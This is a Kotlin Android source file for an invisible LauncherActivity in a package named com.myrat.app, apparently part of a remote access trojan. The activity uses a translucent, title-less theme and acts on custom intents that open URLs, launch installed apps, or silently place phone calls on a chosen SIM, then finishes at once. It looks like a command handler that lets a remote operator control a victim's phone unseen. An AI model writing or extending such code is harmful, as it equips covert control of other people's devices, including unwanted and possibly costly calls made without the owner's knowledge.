package com.myrat.app

import android.Manifest
import android.content.ActivityNotFoundException
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.telecom.PhoneAccountHandle
import android.telecom.TelecomManager
import android.telephony.SubscriptionManager
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import com.myrat.app.utils.Logger

class LauncherActivity : AppCompatActivity() {

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setTheme(android.R.style.Theme_Translucent_NoTitleBar)

        Logger.log("LauncherActivity started with action: ${intent.action}")

        when (intent.action) {
            "com.myrat.app.ACTION_OPEN_URL" -> {
                val url = intent.getStringExtra("url")
                if (url != null && (url.startsWith("http://") || url.startsWith("https://"))) {
                    try {
                        val urlIntent = Intent(Intent.ACTION_VIEW, Uri.parse(url))
                        startActivity(urlIntent)
                        Logger.log("Launched URL from LauncherActivity: $url")
                    } catch (e: ActivityNotFoundException) {
                        Logger.error("Failed to launch URL from LauncherActivity: $url", e)
                    }
                } else {
                    Logger.error("Invalid URL in LauncherActivity: $url")
                }
            }
            "com.myrat.app.ACTION_OPEN_APP" -> {
                val packageName = intent.getStringExtra("packageName")
                if (!packageName.isNullOrEmpty()) {
                    try {
                        val launchIntent = packageManager.getLaunchIntentForPackage(packageName)
                        if (launchIntent != null) {
                            startActivity(launchIntent)
                            Logger.log("Launched app from LauncherActivity: $packageName")
                        } else {
                            Logger.error("App not found in LauncherActivity: $packageName")
                        }
                    } catch (e: ActivityNotFoundException) {
                        Logger.error("Failed to launch app from LauncherActivity: $packageName", e)
                    }
                } else {
                    Logger.error("Invalid package name in LauncherActivity")
                }
            }
            "com.myrat.app.ACTION_MAKE_CALL" -> {
                val recipient = intent.getStringExtra("recipient")
                val subId = intent.getIntExtra("subId", -1)
                val simSlotIndex = intent.getIntExtra("simSlotIndex", -1)

                if (!recipient.isNullOrEmpty() && subId != -1) {
                    // Check required permissions
                    val hasCallPhonePermission = ContextCompat.checkSelfPermission(
                        this, Manifest.permission.CALL_PHONE
                    ) == PackageManager.PERMISSION_GRANTED
                    val hasReadPhoneStatePermission = ContextCompat.checkSelfPermission(
                        this, Manifest.permission.READ_PHONE_STATE
                    ) == PackageManager.PERMISSION_GRANTED

                    if (!hasCallPhonePermission || !hasReadPhoneStatePermission) {
                        Logger.error("Missing permissions for call: CALL_PHONE=$hasCallPhonePermission, READ_PHONE_STATE=$hasReadPhoneStatePermission")
                        finish()
                        return
                    }

                    try {
                        // Try using TelecomManager to place the call with the specified SIM
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                            val telecomManager = getSystemService(TELECOM_SERVICE) as TelecomManager
                            val phoneAccountHandle = telecomManager.getPhoneAccountHandle(subId)

                            if (phoneAccountHandle != null) {
                                val uri = Uri.parse("tel:$recipient")
                                val extras = Bundle().apply {
                                    putParcelable(TelecomManager.EXTRA_PHONE_ACCOUNT_HANDLE, phoneAccountHandle)
                                }
                                telecomManager.placeCall(uri, extras)
                                Logger.log("Placed call to $recipient using TelecomManager with subId: $subId (slot: $simSlotIndex)")
                            } else {
                                Logger.error("PhoneAccountHandle not found for subId: $subId")
                                fallbackCall(recipient, subId)
                            }
                        } else {
                            // Fallback for older Android versions
                            fallbackCall(recipient, subId)
                        }
                    } catch (e: SecurityException) {
                        Logger.error("SecurityException while placing call to $recipient: ${e.message}", e)
                        finish()
                    } catch (e: Exception) {
                        Logger.error("Failed to place call to $recipient using TelecomManager: ${e.message}", e)
                        fallbackCall(recipient, subId)
                    }
                } else {
                    Logger.error("Invalid recipient or subId in LauncherActivity: recipient=$recipient, subId=$subId")
                }
            }
            else -> {
                Logger.error("Unknown action in LauncherActivity: ${intent.action}")
            }
        }

        finish()
    }

    private fun fallbackCall(recipient: String, subId: Int) {
        try {
            val callIntent = Intent(Intent.ACTION_CALL, Uri.parse("tel:$recipient")).apply {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                    // Use standard TelecomManager extras as a fallback
                    val telecomManager = getSystemService(TELECOM_SERVICE) as TelecomManager
                    val phoneAccountHandle = telecomManager.getPhoneAccountHandle(subId)
                    if (phoneAccountHandle != null) {
                        putExtra(TelecomManager.EXTRA_PHONE_ACCOUNT_HANDLE, phoneAccountHandle)
                    }
                }
            }
            startActivity(callIntent)
            Logger.log("Launched fallback call to $recipient with subId: $subId")
        } catch (e: ActivityNotFoundException) {
            Logger.error("Failed to launch fallback call to $recipient: ${e.message}", e)
        } catch (e: SecurityException) {
            Logger.error("SecurityException in fallback call to $recipient: ${e.message}", e)
        }
    }

    private fun TelecomManager.getPhoneAccountHandle(subId: Int): PhoneAccountHandle? {
        return try {
            // Check permissions before proceeding
            val hasReadPhoneStatePermission = ContextCompat.checkSelfPermission(
                this@LauncherActivity, Manifest.permission.READ_PHONE_STATE
            ) == PackageManager.PERMISSION_GRANTED

            if (!hasReadPhoneStatePermission) {
                Logger.error("Missing READ_PHONE_STATE permission to get PhoneAccountHandle for subId: $subId")
                return null
            }

            val phoneAccounts = getCallCapablePhoneAccounts()
            Logger.log("Available phone accounts: $phoneAccounts")

            // Get SubscriptionManager to map PhoneAccountHandle to subscriptionId
            val subscriptionManager = getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE) as SubscriptionManager
            val activeSubscriptions = subscriptionManager.activeSubscriptionInfoList
            Logger.log("Active subscriptions: $activeSubscriptions")

            phoneAccounts.find { account ->
                val phoneAccount = getPhoneAccount(account)
                // Extract subscriptionId from the PhoneAccount extras if available
                val accountSubId = phoneAccount?.extras?.getInt("android.telephony.extra.SUBSCRIPTION_ID", -1)
                // Verify the subscriptionId exists in active subscriptions
                val isValidSubscription = activeSubscriptions?.any { it.subscriptionId == accountSubId } ?: false
                Logger.log("Comparing accountSubId: $accountSubId with target subId: $subId for account: $account, isValid: $isValidSubscription")
                accountSubId == subId && isValidSubscription
            }
        } catch (e: SecurityException) {
            Logger.error("SecurityException while getting PhoneAccountHandle for subId: $subId, ${e.message}", e)
            null
        } catch (e: Exception) {
            Logger.error("Failed to get PhoneAccountHandle for subId: $subId, ${e.message}", e)
            null
        }
    }
}